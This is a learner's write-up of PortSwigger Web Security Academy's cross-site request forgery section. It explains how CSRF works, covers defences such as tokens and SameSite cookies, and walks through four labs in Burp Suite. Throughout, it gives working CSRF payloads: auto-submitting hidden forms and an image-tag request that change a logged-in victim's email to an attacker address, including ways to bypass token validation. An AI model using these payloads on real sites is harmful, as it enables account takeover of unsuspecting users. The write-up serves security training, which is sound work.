# Cross-site request forgery (CSRF) [PortSwigger Academy]

<sup>This write-up covers the Cross-site request forgery section of Web Security Academy by PortSwigger.</sup>

## What is CSRF

_Cross-site request forgery (CSRF)_ --- a type of web security flaw where an attacker tricks a user into unintentionally carrying out actions on a website they're already authenticated with. This exploit allows the attacker to bypass some protections of the same-origin policy, which is meant to stop one website from affecting another.

## What is the impact of a CSRF attack?

In a successful CSRF attack, the attacker manipulates the victim into performing an action they didn't intend to. This could include things like changing their account's email address or password, or even initiating a money transfer. Depending on what the action does, the attacker might end up gaining full access to the victim's account. If the targeted user holds admin or elevated privileges, the attacker could potentially take over the entire application, including all of its data and features. 

## How does CSRF work?

For a CSRF attack to succeed, three main conditions must be met:

1. __A valuable action__ --- There must be a meaningful action in the application that the attacker wants the user to unknowingly perform. This could be something high-impact like changing another user's permissions or something personal like updating the victim's password.
2. __Session tracked via cookies only__ --- The application uses session cookies to recognize users, and doesn't rely on any additional safeguards (like tokens or custom headers) to validate the ligitimacy of the request. 
3. __Predictable request structure__ --- The attacker must be able to predict or know all required parameters in the request. If the request needs something the attacker can't guess (like the user's current password), the attack won't work. 

### How does CSRF work? - Continued

Let's say a web app lets users update their email addresses. When someone changes theirs, the browser sends a request like this:

```
POST /email/change HTTP/1.1  
Host: vulnerable-website.com  
Content-Type: application/x-www-form-urlencoded  
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE  

email=wiener@normal-user.com  
```

This situation is vulnerable to CSRF because:

- __The action is valuable to an attacker__ --- If the attacker changes the user's email, they can later reset the password and hijack the account.
- __Session is tracked only by a cookie__ --- The app uses a session cookie to recognize the user but doesn't have any extra protection like CSRF tokens.
- __The request parameters are predictable__ --- The attacker knows what data to send and can craft the request easily. 

### How does CSRF work? - Continued

The attacker hereby can use this situation and create a web page with the following HTML:

```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

What this does:

- The `<form>` is set up to submit a request to the vulnerable site's endpoint that handles email address changes.
- The form has a hidden input field that sets the new email to an attacker controlled address (`pwned@evil-user.net`)
- The JavaScript at the bottom automatically submits the form as soon as the page loads.

### How does CSRF work? - Continued

How it works in a real attack:

The attacker sends this malicious HTML to the victim, maybe by embedding it in a blog post, an ad, or a phishing email. If the victim is __already logged in__ to the vulnerable website in the same browser:
- Their browser will include the session cookie automatically with the request.
- The vulnerable website will think the request is coming from the legitimate user.
- The email address on the user's account will be silently changed to the attacker's address.

After that, the attacker can trigger a password reset, receive the reset link at their own email, and take over the victim's account --- without the user ever realizing it. 

> NOTE: Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.

## How to construct a CSRF attack

Writing the HTML code for a CSRF attack manually can be tedious --- especially if the request has lots of parameters or behaves in a strange way. Fortunately, __Burp Suite Professional__ has built-in __CSRF Proof of Concept (PoC) generator__ that makes this process much easier:

Here's how you use it:
1. __Find a request__ in Burp Suite that you want to test for CSRF (for example, one that changes a user's email or password).
2. __Right-click__ the request and go to `Engagement tools -> Generate CSRF PoC`
3. Burp Suite will then automatically create the basic HTML needed to replicate the request. _(Note: It won't include cookies --- those are added automatically by the browser when the victim is logged in.)_
4. You can __adjust the generated HTML__ using the PoC generator's settings. This is useful if the request has special requirements or unusual behavior.
5. Finally, copy the HTML into a page and open it in a browser where the victim is already logged in to the vulnerable site. If the exploit works, the request will be sent and the action (like changing the email) will be performed --- without user consent. 

### Lab: CSRF vulnerability with no defenses

Launch Burp Suite, go to __Proxy__ and open browser. Access lab in the browser and log in with credentials `wiener:peter`.

Submit the "Update email" form and find the resulting request in the Proxy history. Request body:

```
email=attacker%40fakemail.com
```

Right click the request and select "Copy URL". Use the URL in the following HTML template:

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

On the lab web page click "Go to exploit server" and paste the resulting HTML to the __Body__ section of the form. Click "Store". 

Click "view exploit" and then check the resulting HTTP request and response to verify that the exploit works. Request body:

```
email=anything%2540web-security-academy.net
```

Change the email address in your exploit so that it doesn't match your own.

Click "Deliver to victim" to solve the lab. 

> NOTE: Check out [walkthrough](csrf_lab01_zaproxy.md) of this lab in OWASP Zed Attack Proxy

## How to deliver a CSRF exploit

Cross-site request forgery (CSRF) attacks are delivered in much the same way as reflected XSS attacks. Typically the attacker hosts the malicious HTML on a website they control and tricks users into visiting it --- often by sending them a link via email, messaging apps, or social media. In some cases, the attacker can embed the exploit in a comment or post on a popular website, simply waiting for users to visit and trigger the attack. 

In simpler CSRF cases, the attack uses the `GET` method and can be executed entirely through a single malicious URL pointing to the vulnerable site. In these scenarios, the attacker may not even need to use an external website --- they can just send the target a crafted link on the vulnerable domain. For instance, if changing a user's email address is possible via a `GET` request, an attacker could exploit this with something as simple as:

```
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

When the image loads, the browser sends the `GET` request automatically --- potentially changing the user's email without their knowledge. 

## Common defences against CSRF

These days, identifying and exploiting CSRF vulnerabilities usually means overcoming built-in protections implemented by the web application, the user's browser, or both. The most common CSRF defenses you'll come across include:

- __CSRF Tokens__ --- These are unique, secret values generated by the server and sent to the client. When the user tries to perform an important action, like submitting a form, the request must include the correct token. This makes it very difficult for attackers to forge valid requests, since they can't easily guess or retrieve the required token.

- __SameSite Cookies__ --- This browser feature controls whether cookies are included in cross-origin requests. Since sensitive actions usually require an authenticated session cookie, the SameSite policy may block the attack from working if the request comes from another domain. As of 2021, Chrome defaults to `SameSite=Lax`, and other browsers are expected to follow this standard.

- __Referer Header Checks__ --- Some applications use the HTTP `Referer` header to check if the request originated from their own domain. While this can help detect cross-site requests, it's generally not as reliable as proper CSRF token validation.

## What is a CSRF token?

A CSRF token is a random, secret value created by the server and sent to the client. It's used to verify that a sensitive action --- like submitting a form --- is being performed intentionally by the legitimate user. If the request doesn't include the correct token, the server will reject it.

One common method of passing the CSRF token to the client is by embedding it as a hidden field within HTML forms. For example:

```
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

This ensures that any submitted request includes the token, helping the server confirm its legitimacy.

### What is a CSRF token? - Continued

When the form is submitted, it sendsa request like this:

```
POST /my-account/change-email HTTP/1.1  
Host: normal-website.com  
Content-Length: 70  
Content-Type: application/x-www-form-urlencoded  

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

If CSRF tokens are implemented properly, they provide strong protection against cross-site request forgery. Since the attacker can't guess the token's value, they can't include it in a forged request --- making it very unlikely for the attack to succeed.

> NOTE: CSRF tokens aren't limited to being hidden form fields in `POST` requests. Some applications pass them in HTTP headers or through other means. The method used to send the token plays a crucial role in the overall effectiveness of the defense. For further details, refer to best practices for preventing CSRF vulnerabilities.

## Common flaws in CSRF token validation

CSRF vulnerabilities often occur because the application fails to properly validate CSRF tokens. This section outlines some of the most common mitakes that allow attackers to bypass these protections. For example some applications validate CSRF tokens only for `POST` requests but neglect to apply the same checks for `GET` requests.

### Validation of CSRF token depends on request method

In such cases, an attacker can exploit this oversight by switching to a `GET` request to carry out the CSRF attack, like so:

```
GET /email/change?email=pwned@evil-user.net HTTP/1.1  
Host: vulnerable-website.com  
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

### Lab: CSRF where token validation depends on request method

Open Burp's browser, navigate to the lab web address and log in with credentials `wiener:peter`. 

Submit the "Update email" form and find the associated request in __Proxy__ > __History__. 
_Request body:_
```
email=attacker%40fakemail.com&csrf=[[...token...]]
```

Send this request to __Repeater__ by right-clicking it and selecting "Send to Repeater" change the `csrf` parameter in the request body to anything else and resend the request. 
_Response:_
```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Invalid CSRF token"
```

As we can see the CSRF token was rejected ("Invalid CSRF token") and the request didn't go through ("400 Bad Request").

Click the __Context Menu__ (three dashes; top-right corner of the request pane) of this request and select __Change request method__. This will automatically convert it into a `GET` request. Resend the request and observe the response:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

CSRF token is no longer verified for `GET` requests. Open the __Context Menu__ again and select "Copy URL". Place this URL in the following HTML template inside the `<form>` tag's `action` attribute's value:

> NOTE: If the copied URL has any query parameters (like `?email=email@email.com&csrf=asdasdh`) remove them before clicking "Store". Also, for me encoding `anything%40web-security-academt.net` didn't work, so I replaced it with `@` symbol in the HTML instead and succeeded.

```
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

From the top bar of the lab web page, click "Go to exploit server" and paste the resulting HTML into the "Body" section of the form, then click "Store".

Click "View exploit" to check if the exploit works by trying it on yourself. Check the resulting HTTP request and response in __Proxy__ > __History__. And also notice the changed email on `/my-account?id=wiener` page you were redirected to. 

```
Your email is: anything@web-security-academy.net
```

Go back to the exploit server and change the email value in the HTML body to anything but the above. Click "Store" and then "Deliver to victim" to solve the lab.

> NOTE: Check out [walkthrough](csrf_lab02_zaproxy.md) of this lab in OWASP Zed Attack Proxy

### Validation of CSRF token depends on token being present

Some applicaiton correctly validate the CSRF token if it is presend, but skip the validation entirely if it is omitted.

In these cases, an attacker can remove the parameter that stores a CSRF token as its value entirely (not just the value) and bypass the validation to deliver a CSRF attack.

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

### Lab: CSRF where token validation depends on token being present

Open Burp's browser, navigate to the lab and log in with credentials `wiener:peter`. 

Submit "Update email" form and find the request in __Proxy__ > __History__ section. 

_Request body:_

```
email=email@email.com&csrf=[[...token...]]
```

Right-click the request and select __Send to Repeater__. In the repeater, notice, if you change the CSRF token in the request body and resend the request it will be rejected. 

_Response:_

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Invalid CSRF token"
```

Now delete the `csrf` parameter in the request body entirely, including its value and resend the request.

_Request body:_

```
email=email@email.com
```

The request was accepted this time.

_Response:_

```
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

Now open the __Context Menu__ (top right corner of the request pane in __Repeater__; three dashes) and click "Copy URL". Use this URL in the following HTML template (`<form>` tag `action` attribute):

> NOTE: edit the second line, attribute `name` should have a value `email` and attribute `value` should have an email to replace the existing email address.

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
    document.forms[0].submit();
</script>
```

Go to exploit server and paste the resulting HTML in the "Body" section of the form and click "Store". 

Click "View exploit" to see if it works on your account. You will be redirected to a page where you'll see that your email has been changed. 

Now go back to the exploit server and change the `value` attribute in the second line of the HTML to any other email than the one your account was changed to. Click "Deliver to victim" to solve the lab. 

> NOTE: Check out [walkthrough](csrf_lab03_zaproxy.md) of this lab in OWASP Zed Attack Proxy

### CSRF token is not tied to the user session

Some applications fail to check whether the CSRF token is tied to the specific session of the user making the request. Instead, they keep a global list of all issued tokens and accept any one of them, regardless of which user it was generated for. 

In this case, an attacker could simply log in with their own account, grab a valid CSRF token, and then include that token in a CSRF payload aimed at the victim. Since the application accepts any token from the global pool, the malicious request will go through successfully. 

### Lab: CSRF where token is not tied to user session

Open Burp's browser and log in using credentials `wiener:peter`. Make sure to turn on __Intercept__ and then submit "Update email" form, and check the resulting request in __Proxy__.

Make a note of the value of the CSRF token, then drop the request. Now within the Burp's browser open an incognito window, log in using credentials `carlos:montoya`.

Again make sure to turn on __Intercept__ and submit "Update email" form and send this `POST /my-account/change-email` request to __Repeater__. 

Replace the CSRF token in the request body with the one you made a note of earlier and send the request. 

_Response:_

```
HTTP/2 302 Found
Location: /my-account?id=carlos
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

This means, that an unused (request was dropped, before it went through) CSRF token we made note of from `wiener:peter` session was used in the `carlos:montoya` session and it still went through. 

Now let's use the HTML payload from the [one of the sections above](#what-is-a-csrf-token).:

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="obscure@email.com">
    <input type="hidden" name="csrf" value="[[...token...]">
</form>
<script>
        document.forms[0].submit();
</script>
```

Replace URL inside `<form>` tag's `action` parameter with the URL of the request we just intercepted and email (`<input name="email"...`) with something we haven't used in this lab so far. Click "Go to exploit server" and paste the resulting HTML in the body section.

Now go back to the lab and log in as `wiener:peter`, intercept the "Update email" request again, copy and save the CSRF token in the request and drop the request again. 

Back to the exploit server and paste the copied CSRF request in the HTML template `<input name="csrf"...` to a `value` parameter. 

Click "Store" and then "Deliver to victim" to solve the lab. 

> NOTE: Check out [walkthrough](csrf_lab04_zaproxy.md) of this lab in OWASP Zed Attack Proxy


